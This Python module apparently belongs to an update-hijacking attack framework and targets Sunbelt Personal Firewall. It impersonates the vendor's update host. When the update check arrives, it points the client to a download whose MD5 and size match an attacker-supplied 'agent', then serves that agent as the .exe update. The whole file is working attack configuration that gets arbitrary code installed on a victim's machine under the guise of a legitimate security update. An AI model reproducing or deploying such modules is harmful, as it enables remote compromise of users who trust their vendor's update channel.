from modules import ModuleBase


class SunbeltPersonalFirewall(ModuleBase):
    name = 'Sunbelt Personal Firewall'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(updates.sunbeltsoftware.com)' 
    requests = [{
            'path': '/SPURS/spurs.asp',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': 'http://updates.sunbeltsoftware.com/SPURS/Downloads/440/Sunbelt/SKPF/EN/4.6.1861/SPF.4.6.1861.<%RND1%>.exe?MD5=<%AGENTMD5%>&SIZE=<%AGENTSIZE%>',
            'parse': 0,
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]